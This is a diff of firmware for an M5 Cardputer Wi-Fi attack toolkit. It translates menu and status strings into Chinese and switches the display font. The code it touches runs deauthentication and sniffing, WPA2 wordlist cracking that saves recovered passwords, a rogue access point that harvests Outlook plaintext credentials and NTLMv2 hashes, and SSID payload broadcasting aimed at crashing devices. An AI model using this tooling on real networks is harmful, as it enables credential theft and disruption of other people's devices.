-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       M5.Display.setCursor(0, 0);
       M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-      M5.Display.println("AP LIST");
+      M5.Display.println("AP 列表");
 
       // Zone d’affichage des AP
       const int startY = 14;
@@ -35752,11 +35990,11 @@ void c5_viewApListAndSelectTarget() {
           (unsigned)g_c5_ap[idx].idx,
           (unsigned)g_c5_ap[idx].ch,
           (int)g_c5_ap[idx].rssi,
-          g_c5_ap[idx].ssid[0] ? g_c5_ap[idx].ssid : "(hidden)");
+          g_c5_ap[idx].ssid[0] ? g_c5_ap[idx].ssid : "(隐藏)");
         M5.Display.print(row);
       }
 
-      c5_uiFooter(";/.:move  /=select  ENTER=send  BK");
+      c5_uiFooter(";/.:移动 /=选择 回车:发送 退格:返回");
       need = false;
     }
 
@@ -35815,10 +36053,10 @@ void c5_viewApListAndSelectTarget() {
       char cmd[160];
       snprintf(cmd, sizeof(cmd), "TARGET INDEX %s", payload);
 
-      c5_uiHeader("TARGET INDEX");
+      c5_uiHeader("设置目标索引");
       M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
       M5.Display.println(cmd);
-      c5_uiFooter("Sending...");
+      c5_uiFooter("发送中...");
 
       c5_sendScriptLine(cmd);
 
@@ -35848,12 +36086,12 @@ void c5_rawMonitor() {
 
   // ================= HEADER =================
   M5.Display.clear();
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setCursor(0, 0);
   M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-  M5.Display.println("C5 RAW MONITOR");
+  M5.Display.println("C5 原始串口监视器");
   M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-  M5.Display.println("` or BK to exit");
+  M5.Display.println("按 ` 或退格键退出");
   M5.Display.display();
 
   uint32_t lastDraw = 0;
@@ -35907,7 +36145,7 @@ void c5_rawMonitor() {
       );
 
       M5.Display.setCursor(0, HEADER_H);
-      M5.Display.setTextSize(1);
+      evilSetCnFont(M5.Display, 1);
       M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
 
       for (int i = 0; i < MAX_LINES; ++i) {
@@ -35941,15 +36179,15 @@ void startESP32C5SerialMenu() {
 
   c5_uartBegin();
 
-  c5_uiHeader("Checking ESP32C5");
-  c5_uiFooter("sending STOP / HELP");
+  c5_uiHeader("正在检测 ESP32C5");
+  c5_uiFooter("正在发送 STOP / HELP");
   delay(1000);
   if (!c5_checkDevicePresent()) {
-    c5_uiHeader("ESP32C5 ERROR");
+    c5_uiHeader("ESP32C5 错误");
     M5.Display.setTextColor(TFT_RED, menuBackgroundColor);
-    M5.Display.println("No response on UART");
-    M5.Display.println("Check wiring / power");
-    c5_uiFooter("BACKSPACE");
+    M5.Display.println("串口无响应");
+    M5.Display.println("请检查接线与供电");
+    c5_uiFooter("按退格键继续");
     delay(2500);
   }
 
@@ -35958,14 +36196,14 @@ void startESP32C5SerialMenu() {
   c5_uartFlushInput();
 
   const char* items[] = {
-    "Start", "Stop", "Scan ALL", "Scan (single)", "List",
-    "Band (ALL/2G/5G)", "Deauth toggle",
-    "Ward toggle", "Ward history (ms)",
-    "Sniff toggle", "Sniff timeout (ms)",
-    "Target SSID", "Target BSSID", "Target INDEX (manual)", "Target clear",
-    "Chan SET", "Chan ADD", "Chan RESET", "Chan CLEAR", "Chan LIST",
-    "Interval (ms)", "History (ms)", "Info", "Config", "Help",
-    "Send custom CMD", "Raw monitor", "Back to menu"
+    "启动攻击", "停止攻击", "扫描全部", "单次扫描", "查看列表",
+    "频段 (ALL/2G/5G)", "切换解除认证",
+    "切换战争驾驶", "战争驾驶历史(ms)",
+    "切换抓包嗅探", "嗅探超时(ms)",
+    "目标 SSID", "目标 BSSID", "目标索引 (手动)", "清空目标",
+    "设置信道", "添加信道", "重置信道", "清空信道", "信道列表",
+    "周期间隔(ms)", "历史记录(ms)", "设备信息", "当前配置", "帮助信息",
+    "发送自定义指令", "原始串口监视器", "返回主菜单"
   };
 
   const int itemCount = sizeof(items) / sizeof(items[0]);
@@ -35981,13 +36219,13 @@ void startESP32C5SerialMenu() {
       M5.Display.clear();
 
       // 🔹 Infos en haut plus petites
-      M5.Display.setTextSize(1);
+      evilSetCnFont(M5.Display, 1);
       M5.Display.setCursor(0, 0);
       M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-      M5.Display.println("ESP32C5 Toolkit");
+      M5.Display.println("ESP32C5 工具箱");
       M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-      M5.Display.printf("Band:%s  Deauth:%s  AP:%u\n", g_c5_band,
-                        g_c5_deauth_on ? "ON" : "OFF", (unsigned)g_c5_ap_count);
+      M5.Display.printf("频段:%s  泛洪:%s  AP:%u\n", g_c5_band,
+                        g_c5_deauth_on ? "开" : "关", (unsigned)g_c5_ap_count);
       M5.Display.printf("UART RX%d TX%d\n", C5RxPin, C5TxPin);
 
       // 🔹 Menu principal plus grand
@@ -36011,12 +36249,12 @@ void startESP32C5SerialMenu() {
         } else {
           M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
         }
-        M5.Display.setTextSize(1.5);
+        evilSetCnFont(M5.Display, 1.5);
         M5.Display.setCursor(4, y);
         M5.Display.print(items[it]);
       }
 
-      c5_uiFooter("^/v ;/.  ENTER  BACKSPACE");
+      c5_uiFooter(";/.:上下  回车:确认  退格:退出");
       need = false;
     }
 
@@ -36045,7 +36283,7 @@ void startESP32C5SerialMenu() {
         c5_uiHeader(title);
         M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
         M5.Display.println(msg);
-        c5_uiFooter("BACKSPACE");
+        c5_uiFooter("按退格键返回");
         while (!kp(KEY_BACKSPACE)) {
           M5.update(); cardUpdate();
           c5_poll_uart();
@@ -36056,7 +36294,7 @@ void startESP32C5SerialMenu() {
 
       switch (index) {
         case 0: c5_sendScriptLine("START"); c5_rawMonitor(); break;
-        case 1: c5_sendScriptLine("STOP"); feedback("STOP", "Attack stopped"); break;
+        case 1: c5_sendScriptLine("STOP"); feedback("停止", "攻击已停止"); break;
         case 2: c5_runScriptListCommand("SCAN ALL"); if (g_c5_ap_count) c5_viewApListAndSelectTarget(); break;
         case 3: c5_runScriptListCommand("SCAN"); if (g_c5_ap_count) c5_viewApListAndSelectTarget(); break;
         case 4: c5_runScriptListCommand("LIST"); if (g_c5_ap_count) c5_viewApListAndSelectTarget(); break;
@@ -36067,13 +36305,13 @@ void startESP32C5SerialMenu() {
             char cmd[16]; snprintf(cmd, sizeof(cmd), "BAND %s", m);
             c5_sendScriptLine(cmd);
             strncpy(g_c5_band, m, sizeof(g_c5_band)-1);
-            feedback("BAND", m);
+            feedback("频段", m);
           }
         } break;
         case 6:
           g_c5_deauth_on = !g_c5_deauth_on;
           c5_sendScriptLine(g_c5_deauth_on ? "DEAUTH ON" : "DEAUTH OFF");
-          feedback("DEAUTH", g_c5_deauth_on ? "Enabled" : "Disabled");
+          feedback("解除认证", g_c5_deauth_on ? "已启用" : "已禁用");
           break;
 
         case 7:
@@ -36081,33 +36319,33 @@ void startESP32C5SerialMenu() {
           c5_sendScriptLine(g_c5_ward_on ? "WARD ON" : "WARD OFF");
           // Ward ON auto-disables DEAUTH+SNIFF on the slave; mirror that locally.
           if (g_c5_ward_on) { g_c5_deauth_on = false; g_c5_sniff_on = false; }
-          feedback("WARD", g_c5_ward_on ? "Enabled" : "Disabled");
+          feedback("战争驾驶", g_c5_ward_on ? "已启用" : "已禁用");
           break;
-        case 8:  c5_promptAndSend("WARD HISTORY ms", "WARD HISTORY"); break;
+        case 8:  c5_promptAndSend("战争驾驶历史(ms)", "WARD HISTORY"); break;
         case 9:
           g_c5_sniff_on = !g_c5_sniff_on;
           c5_sendScriptLine(g_c5_sniff_on ? "SNIFF ON" : "SNIFF OFF");
-          feedback("SNIFF", g_c5_sniff_on ? "Enabled" : "Disabled");
+          feedback("抓包嗅探", g_c5_sniff_on ? "已启用" : "已禁用");
           break;
-        case 10: c5_promptAndSend("SNIFF_TIMEOUT ms", "SNIFF_TIMEOUT"); break;
+        case 10: c5_promptAndSend("嗅探超时(ms)", "SNIFF_TIMEOUT"); break;
 
-        case 11:  c5_promptAndSend("TARGET SSID", "TARGET SSID"); break;
-        case 12:  c5_promptAndSend("TARGET BSSID", "TARGET BSSID"); break;
-        case 13:  c5_promptAndSend("TARGET INDEX", "TARGET INDEX"); break;
-        case 14: c5_sendScriptLine("TARGET CLEAR"); feedback("TARGET", "Cleared"); break;
+        case 11:  c5_promptAndSend("目标 SSID", "TARGET SSID"); break;
+        case 12:  c5_promptAndSend("目标 BSSID", "TARGET BSSID"); break;
+        case 13:  c5_promptAndSend("目标索引", "TARGET INDEX"); break;
+        case 14: c5_sendScriptLine("TARGET CLEAR"); feedback("目标", "已清空"); break;
 
-        case 15: c5_promptAndSend("CHAN SET", "CHAN SET"); break;
-        case 16: c5_promptAndSend("CHAN ADD", "CHAN ADD"); break;
-        case 17: c5_sendScriptLine("CHAN RESET"); feedback("CHANNELS", "Reset"); break;
-        case 18: c5_sendScriptLine("CHAN CLEAR"); feedback("CHANNELS", "Cleared"); break;
+        case 15: c5_promptAndSend("设置信道", "CHAN SET"); break;
+        case 16: c5_promptAndSend("添加信道", "CHAN ADD"); break;
+        case 17: c5_sendScriptLine("CHAN RESET"); feedback("信道", "已重置"); break;
+        case 18: c5_sendScriptLine("CHAN CLEAR"); feedback("信道", "已清空"); break;
         case 19: c5_sendScriptLine("CHAN LIST"); c5_rawMonitor(); break;
 
-        case 20: c5_promptAndSend("INTERVAL ms", "INTERVAL"); break;
-        case 21: c5_promptAndSend("HISTORY ms", "HISTORY"); break;
+        case 20: c5_promptAndSend("周期间隔(ms)", "INTERVAL"); break;
+        case 21: c5_promptAndSend("历史记录(ms)", "HISTORY"); break;
         case 22: c5_sendScriptLine("INFO"); c5_rawMonitor(); break;
         case 23: c5_sendScriptLine("CONFIG"); c5_rawMonitor(); break;
         case 24: c5_sendScriptLine("HELP"); c5_rawMonitor(); break;
-        case 25: c5_promptAndSend("Custom CMD", ""); break;
+        case 25: c5_promptAndSend("自定义指令", ""); break;
         case 26: c5_rawMonitor(); break;
         case 27: backDebounce(); goto exit_menu;
       }
@@ -36121,7 +36359,7 @@ void startESP32C5SerialMenu() {
 
 exit_menu:
   c5_uartEnd();
-  waitAndReturnToMenu("Back to menu");
+  waitAndReturnToMenu("返回主菜单");
 }
 
 
@@ -36885,16 +37123,16 @@ bool evil_wpa2_wordlist_attack(const evil_wpa2_hs_t &hs, const char *path,
       float speed = dt ? att * 1000.0f / dt : 0;
 
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       M5.Display.setCursor(5, 5);
-      M5.Display.println("WPA2 Dual-Core Crack");
+      M5.Display.println("WPA2 双核破解");
       M5.Display.println("--------------------");
       M5.Display.printf("SSID: %s\n", hs.ssid);
-      M5.Display.printf("Try : %s\n", line);
-      M5.Display.printf("Cnt : %lu\n", (unsigned long)att);
-      M5.Display.printf("Speed: %.1f/s\n", speed);
+      M5.Display.printf("尝试: %s\n", line);
+      M5.Display.printf("次数: %lu\n", (unsigned long)att);
+      M5.Display.printf("速度: %.1f/s\n", speed);
       if (speed > 0) {
-        M5.Display.printf("[BACK] to abort");
+        M5.Display.printf("[退格] 中止破解");
       }
       M5.Display.display();
 
@@ -36925,14 +37163,14 @@ bool evil_wpa2_wordlist_attack(const evil_wpa2_hs_t &hs, const char *path,
       out_pw[out_pw_sz - 1] = '\0';
     }
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 10);
-    M5.Display.println("PASSWORD FOUND!");
+    M5.Display.println("已找到密码!");
     M5.Display.println("--------------------");
     M5.Display.println(shared.found_pw);
-    M5.Display.printf("\n%lu tries", (unsigned long)shared.attempts);
+    M5.Display.printf("\n尝试 %lu 次", (unsigned long)shared.attempts);
     uint32_t dt = millis() - t0;
-    M5.Display.printf("\nTime: %lus", (unsigned long)(dt / 1000));
+    M5.Display.printf("\n耗时: %lus", (unsigned long)(dt / 1000));
     M5.Display.display();
     delay(8000);
   }
@@ -36999,15 +37237,15 @@ int evil_wpa2_crack_pcap(const String &pcapPath, const String &pcapName,
     macToStr(g_wpa2.ap, apm);
 
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 0);
     M5.Display.printf("AP %d/%d\n", globalIdx, totalAps);
-    M5.Display.println("Dual-Core Attack");
+    M5.Display.println("双核字典攻击");
     M5.Display.println("--------------------");
     M5.Display.printf("SSID: %s\n", g_wpa2.ssid);
     M5.Display.printf("AP: %s\n", apm);
-    M5.Display.printf("WL: %s\n", wlName.c_str());
-    M5.Display.println("Starting...");
+    M5.Display.printf("字典: %s\n", wlName.c_str());
+    M5.Display.println("正在启动...");
     M5.Display.display();
     delay(300);
 
@@ -37021,11 +37259,11 @@ int evil_wpa2_crack_pcap(const String &pcapPath, const String &pcapName,
       evil_wpa2_save_cracked(entry.ssid, found_pw);
 
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       M5.Display.setCursor(5, 15);
-      M5.Display.printf("CRACKED: %s\n", entry.ssid);
-      M5.Display.printf("PW: %s\n", found_pw);
-      M5.Display.println("Saved! Continuing...");
+      M5.Display.printf("已破解: %s\n", entry.ssid);
+      M5.Display.printf("密码: %s\n", found_pw);
+      M5.Display.println("已保存! 继续中...");
       M5.Display.display();
       delay(2000);
     }
@@ -37058,15 +37296,15 @@ void evil_wpa2_passphrase_check_menu() {
       dir.close();
     }
   }
-  if (files.empty()) { waitAndReturnToMenu("No PCAP found"); return; }
+  if (files.empty()) { waitAndReturnToMenu("未找到 PCAP 文件"); return; }
 
   /* Build menu: [ALL] + individual files */
   std::vector<String> pcapMenu;
-  pcapMenu.push_back("[ALL] Test all PCAPs");
+  pcapMenu.push_back("[全部] 测试所有 PCAP");
   for (const String &fn : files) pcapMenu.push_back(fn);
 
-  int pcapChoice = menuSelectList(pcapMenu, "Select PCAP");
-  if (pcapChoice < 0) { waitAndReturnToMenu("Cancelled"); return; }
+  int pcapChoice = menuSelectList(pcapMenu, "选择 PCAP 文件");
+  if (pcapChoice < 0) { waitAndReturnToMenu("已取消"); return; }
 
   bool allPcaps = (pcapChoice == 0);
 
@@ -37085,10 +37323,10 @@ void evil_wpa2_passphrase_check_menu() {
       dir.close();
     }
   }
-  if (wlFiles.empty()) { waitAndReturnToMenu("No wordlist in /evil/"); return; }
+  if (wlFiles.empty()) { waitAndReturnToMenu("/evil/ 下无字典文件"); return; }
 
-  int wlIdx = menuSelectList(wlFiles, "Select Wordlist");
-  if (wlIdx < 0) { waitAndReturnToMenu("Cancelled"); return; }
+  int wlIdx = menuSelectList(wlFiles, "选择字典文件");
+  if (wlIdx < 0) { waitAndReturnToMenu("已取消"); return; }
 
   String wlPath = String(WL_DIR) + "/" + wlFiles[wlIdx];
   Serial.printf("[WPA2] Wordlist: %s\n", wlPath.c_str());
@@ -37107,14 +37345,14 @@ void evil_wpa2_passphrase_check_menu() {
       }
     }
 
-    if (totalAps == 0) { waitAndReturnToMenu("No valid HS in any PCAP"); return; }
+    if (totalAps == 0) { waitAndReturnToMenu("所有 PCAP 均无有效握手包"); return; }
 
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 10);
-    M5.Display.printf("ALL mode: %d PCAPs\n", (int)files.size());
-    M5.Display.printf("%d valid APs\n", totalAps);
-    M5.Display.println("Starting...");
+    M5.Display.printf("全部模式: %d 个 PCAP\n", (int)files.size());
+    M5.Display.printf("%d 个有效 AP\n", totalAps);
+    M5.Display.println("正在启动...");
     M5.Display.display();
     delay(1000);
 
@@ -37140,7 +37378,7 @@ void evil_wpa2_passphrase_check_menu() {
     }
 
     char msg[64];
-    snprintf(msg, sizeof(msg), "Done: %d/%d cracked", totalFound, totalAps);
+    snprintf(msg, sizeof(msg), "完成: 已破解 %d/%d", totalFound, totalAps);
     waitAndReturnToMenu(msg);
     return;
   }
@@ -37150,9 +37388,9 @@ void evil_wpa2_passphrase_check_menu() {
   Serial.printf("[WPA2] Selected: %s\n", pcapPath.c_str());
 
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5, 5);
-  M5.Display.println("Parsing PCAP...");
+  M5.Display.println("正在解析 PCAP...");
   M5.Display.println(files[pcapChoice - 1]);
   M5.Display.display();
 
@@ -37166,7 +37404,7 @@ void evil_wpa2_passphrase_check_menu() {
       validIdx.push_back(i);
     }
   }
-  if (validIdx.empty()) { waitAndReturnToMenu("No valid HS/SSID"); return; }
+  if (validIdx.empty()) { waitAndReturnToMenu("无有效握手包/SSID"); return; }
 
   Serial.printf("[WPA2] Found %d valid AP(s)\n", (int)validIdx.size());
 
@@ -37176,7 +37414,7 @@ void evil_wpa2_passphrase_check_menu() {
 
   if (validIdx.size() > 1) {
     std::vector<String> apMenu;
-    apMenu.push_back("[ALL] Crack all APs");
+    apMenu.push_back("[全部] 破解所有 AP");
     for (int vi : validIdx) {
       char bssidStr[18];
       sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -37187,8 +37425,8 @@ void evil_wpa2_passphrase_check_menu() {
       apMenu.push_back(label);
     }
 
-    int apChoice = menuSelectList(apMenu, "Select AP");
-    if (apChoice < 0) { waitAndReturnToMenu("Cancelled"); return; }
+    int apChoice = menuSelectList(apMenu, "选择目标 AP");
+    if (apChoice < 0) { waitAndReturnToMenu("已取消"); return; }
 
     if (apChoice == 0) {
       crackAllAps = true;
@@ -37212,7 +37450,7 @@ void evil_wpa2_passphrase_check_menu() {
     if (!evil_wpa2_extract_by_bssid(pcapPath, entry.bssid, entry.ssid, g_wpa2)) {
       Serial.printf("[WPA2] Failed to extract HS for %s, skipping\n", entry.ssid);
       if (crackAllAps) continue;
-      waitAndReturnToMenu("HS extract failed");
+      waitAndReturnToMenu("握手包提取失败");
       return;
     }
 
@@ -37220,17 +37458,17 @@ void evil_wpa2_passphrase_check_menu() {
     macToStr(g_wpa2.ap, apm);
 
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 0);
     if (crackAllAps || endAp - startAp > 1) {
       M5.Display.printf("AP %d/%d\n", ai - startAp + 1, endAp - startAp);
     }
-    M5.Display.println("Dual-Core Attack");
+    M5.Display.println("双核字典攻击");
     M5.Display.println("--------------------");
     M5.Display.printf("SSID: %s\n", g_wpa2.ssid);
     M5.Display.printf("AP: %s\n", apm);
-    M5.Display.printf("WL: %s\n", wlFiles[wlIdx].c_str());
-    M5.Display.println("Starting...");
+    M5.Display.printf("字典: %s\n", wlFiles[wlIdx].c_str());
+    M5.Display.println("正在启动...");
     M5.Display.display();
     delay(300);
 
@@ -37244,19 +37482,19 @@ void evil_wpa2_passphrase_check_menu() {
       evil_wpa2_save_cracked(entry.ssid, found_pw);
 
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       M5.Display.setCursor(5, 15);
-      M5.Display.printf("CRACKED: %s\n", entry.ssid);
-      M5.Display.printf("PW: %s\n", found_pw);
-      M5.Display.println("Saved to cracked.txt");
+      M5.Display.printf("已破解: %s\n", entry.ssid);
+      M5.Display.printf("密码: %s\n", found_pw);
+      M5.Display.println("已存至 cracked.txt");
       M5.Display.display();
 
       if (!crackAllAps) {
         delay(3000);
-        waitAndReturnToMenu("Password Found!");
+        waitAndReturnToMenu("已找到密码!");
         return;
       }
-      M5.Display.println("Continuing...");
+      M5.Display.println("继续中...");
       M5.Display.display();
       delay(2000);
     }
@@ -37264,9 +37502,9 @@ void evil_wpa2_passphrase_check_menu() {
 
   char msg[64];
   if (crackAllAps) {
-    snprintf(msg, sizeof(msg), "Done: %d/%d cracked", foundCount, endAp - startAp);
+    snprintf(msg, sizeof(msg), "完成: 已破解 %d/%d", foundCount, endAp - startAp);
   } else {
-    snprintf(msg, sizeof(msg), "No match found");
+    snprintf(msg, sizeof(msg), "未找到匹配密码");
   }
   waitAndReturnToMenu(msg);
 }
@@ -37853,16 +38091,16 @@ void adUpdateCaptureUI() {
   d.fillScreen(BLACK);
 
   // Title
-  d.setTextSize(1.5);
+  evilSetCnFont(d, 1.5);
   d.setTextColor(TFT_GREEN, BLACK);
   d.setCursor(5, 3);
-  d.print("AUTODISCOVER");
+  d.print("自动发现凭证劫持");
 
   // Counters
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 20);
   d.setTextColor(TFT_CYAN, BLACK);
-  d.print("Basic: ");
+  d.print("明文: ");
   d.setTextColor(WHITE, BLACK);
   d.print(adBasicCount);
   d.setTextColor(TFT_CYAN, BLACK);
@@ -37871,54 +38109,54 @@ void adUpdateCaptureUI() {
   d.print(adNtlmCount);
 
   // Last capture type
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 37);
   if (adLastType == "BASIC") {
     d.setTextColor(TFT_GREEN, BLACK);
-    d.print("[PLAINTEXT]");
+    d.print("[明文密码]");
   } else {
     d.setTextColor(TFT_YELLOW, BLACK);
-    d.print("[NTLMv2 HASH]");
+    d.print("[NTLMv2 哈希]");
   }
 
   // Email
   d.setTextColor(WHITE, BLACK);
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 54);
-  d.print("Email: ");
-  d.setTextSize(1.5);
+  d.print("邮箱: ");
+  evilSetCnFont(d, 1.5);
   d.setCursor(5, 67);
   String dispEmail = adLastEmail;
   if (dispEmail.length() > 28) dispEmail = dispEmail.substring(0, 25) + "...";
   d.print(dispEmail);
 
   // User / Domain
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 85);
   d.setTextColor(TFT_DARKGREY, BLACK);
   d.print(adLastUser + " @ " + adLastDomain);
 
   // Client IP
   d.setCursor(5, 100);
-  d.print("from " + adLastClient);
+  d.print("来自 " + adLastClient);
 
   // Footer
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(TFT_DARKGREY, BLACK);
   d.setCursor(5, d.height() - 12);
-  d.print("BACKSPACE = exit");
+  d.print("退格键 = 退出");
 }
 
 void adUpdateWaitingUI(const String &ssid) {
   auto &d = M5Cardputer.Display;
   d.fillScreen(BLACK);
 
-  d.setTextSize(1.5);
+  evilSetCnFont(d, 1.5);
   d.setTextColor(TFT_GREEN, BLACK);
   d.setCursor(5, 5);
-  d.print("AUTODISCOVER");
+  d.print("自动发现凭证劫持");
 
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setTextColor(WHITE, BLACK);
   d.setCursor(5, 25);
   d.print("AP: ");
@@ -37926,33 +38164,33 @@ void adUpdateWaitingUI(const String &ssid) {
 
   d.setCursor(5, 42);
   d.setTextColor(TFT_CYAN, BLACK);
-  d.print("Mode: Basic + NTLM");
+  d.print("模式: Basic + NTLM");
 
   // Animated waiting
   d.setCursor(5, 60);
   d.setTextColor(TFT_YELLOW, BLACK);
-  d.print("Waiting Outlook");
+  d.print("等待 Outlook 连接");
   for (int i = 0; i < (int)(adAnim % 4); i++) d.print(".");
   d.print("   ");
 
   // Connected clients
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setTextColor(TFT_DARKGREY, BLACK);
   d.setCursor(5, 80);
-  d.print("Clients: ");
+  d.print("客户端: ");
   d.setTextColor(WHITE, BLACK);
   d.print(WiFi.softAPgetStationNum());
 
   d.setCursor(5, 95);
   d.setTextColor(TFT_DARKGREY, BLACK);
-  d.print("Captures: ");
+  d.print("已捕获: ");
   d.setTextColor(WHITE, BLACK);
   d.print(adBasicCount + adNtlmCount);
 
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(TFT_DARKGREY, BLACK);
   d.setCursor(5, d.height() - 12);
-  d.print("BACKSPACE = exit");
+  d.print("退格键 = 退出");
 
   adAnim++;
 }
@@ -38009,7 +38247,7 @@ void autodiscoverAbuse() {
   // --- DNS wildcard ---
   if (!dnsServer.start(53, "*", ipAP)) {
     Serial.println(F("[-] DNS failed!"));
-    waitAndReturnToMenu("DNS Failed");
+    waitAndReturnToMenu("DNS 启动失败");
     return;
   }
 
@@ -38063,11 +38301,11 @@ void autodiscoverAbuse() {
   dnsServer.stop();
   WiFi.mode(WIFI_MODE_APSTA);
 
-  String exitMsg = "Autodiscover stopped\n"
-    "Basic: " + String(adBasicCount) + " (plaintext)\n"
-    "NTLMv2: " + String(adNtlmCount) + " (hash)\n";
+  String exitMsg = "自动发现劫持已停止\n"
+    "Basic: " + String(adBasicCount) + " (明文)\n"
+    "NTLMv2: " + String(adNtlmCount) + " (哈希)\n";
   if ((adBasicCount + adNtlmCount) > 0)
-    exitMsg += "Saved to SD:/evil/";
+    exitMsg += "已保存至 SD:/evil/";
   waitAndReturnToMenu(exitMsg);
 }
 
@@ -38505,11 +38743,11 @@ void ciwBroadcastLoop() {
     if (millis() - lastDisplayUpdate > 500) {
       lastDisplayUpdate = millis();
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
-      M5.Display.setTextFont(1);
+      evilSetCnFont(M5.Display, 1.5);
+      evilKeepCnFont(M5.Display);
       M5.Display.setCursor(5, 2);
       M5.Display.setTextColor(TFT_GREEN);
-      M5.Display.println("CIW Broadcasting");
+      M5.Display.println("CIW 正在广播");
       M5.Display.setTextColor(menuTextUnFocusedColor);
       M5.Display.println();
 
@@ -38517,20 +38755,20 @@ void ciwBroadcastLoop() {
       if (currentSsid.length() > 26) currentSsid = currentSsid.substring(0, 24) + "..";
       M5.Display.println("SSID: " + currentSsid);
 
-      M5.Display.println("Payload: " + String(ciwCurrentIdx + 1) + "/" +
+      M5.Display.println("载荷: " + String(ciwCurrentIdx + 1) + "/" +
         String((int)ciwPayloads.size()));
 
       uint8_t catIdx = ciwPayloads[ciwCurrentIdx].cat;
       if (catIdx < CIW_CAT_COUNT) {
-        M5.Display.println("Cat: " + String(ciwCatNames[catIdx]));
+        M5.Display.println("分类: " + String(ciwCatNames[catIdx]));
       }
 
-      M5.Display.println("Devices: " + String(ciwDeviceCount));
+      M5.Display.println("设备: " + String(ciwDeviceCount));
 
       if (ciwAlertCount > 0) {
         M5.Display.setTextColor(TFT_RED);
       }
-      M5.Display.println("Alerts: " + String(ciwAlertCount));
+      M5.Display.println("告警: " + String(ciwAlertCount));
       M5.Display.setTextColor(menuTextUnFocusedColor);
 
       unsigned long elapsed = millis() - ciwLastRotation;
@@ -38538,11 +38776,11 @@ void ciwBroadcastLoop() {
       if (elapsed < ciwRotationInterval) {
         remaining = (ciwRotationInterval - elapsed) / 1000;
       }
-      M5.Display.println("Next: " + String(remaining) + "s");
+      M5.Display.println("切换: " + String(remaining) + "s");
 
       M5.Display.println();
       M5.Display.setTextColor(TFT_DARKGREY);
-      M5.Display.println(";/. prev/next  BS stop");
+      M5.Display.println(";/. 切换  退格键停止");
       M5.Display.display();
     }
 
@@ -38566,8 +38804,8 @@ void ciwSelectCategories() {
 
   while (true) {
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
-    M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1.5);
+    evilKeepCnFont(M5.Display);
 
     for (int i = 0; i < maxVisible; i++) {
       int idx = startIdx + i;
@@ -38578,9 +38816,9 @@ void ciwSelectCategories() {
         bool selected = (ciwSelectedCats & (1 << idx)) != 0;
         label = String(selected ? "[x] " : "[ ] ") + String(ciwCatNames[idx]);
       } else if (idx == CIW_CAT_COUNT) {
-        label = ">>> Select All";
+        label = ">>> 全选";
       } else {
-        label = ">>> Deselect All";
+        label = ">>> 全不选";
       }
 
       if (idx == currentIndex) {
@@ -38632,16 +38870,16 @@ void ciwSelectCategories() {
 // ── Cardputer UI — View Devices ────────────────────────────────────────────
 void ciwViewDevices() {
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
-  M5.Display.setTextFont(1);
+  evilSetCnFont(M5.Display, 1.5);
+  evilKeepCnFont(M5.Display);
   M5.Display.setCursor(5, 2);
   M5.Display.setTextColor(TFT_CYAN);
-  M5.Display.println("Connected Devices");
+  M5.Display.println("已连接设备");
   M5.Display.setTextColor(menuTextUnFocusedColor);
   M5.Display.println();
 
   if (ciwDeviceCount == 0) {
-    M5.Display.println("No devices recorded.");
+    M5.Display.println("暂无设备记录.");
   } else {
     int shown = min(ciwDeviceCount, 6);
     for (int i = 0; i < shown; i++) {
@@ -38657,7 +38895,7 @@ void ciwViewDevices() {
       }
     }
     if (ciwDeviceCount > shown) {
-      M5.Display.println("..." + String(ciwDeviceCount - shown) + " more");
+      M5.Display.println("...还有 " + String(ciwDeviceCount - shown) + " 台");
     }
   }
 
@@ -38675,16 +38913,16 @@ void ciwViewDevices() {
 // ── Cardputer UI — View Alerts ─────────────────────────────────────────────
 void ciwViewAlerts() {
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
-  M5.Display.setTextFont(1);
+  evilSetCnFont(M5.Display, 1.5);
+  evilKeepCnFont(M5.Display);
   M5.Display.setCursor(5, 2);
   M5.Display.setTextColor(TFT_RED);
-  M5.Display.println("Crash Alerts");
+  M5.Display.println("崩溃告警");
   M5.Display.setTextColor(menuTextUnFocusedColor);
   M5.Display.println();
 
   if (ciwAlertCount == 0) {
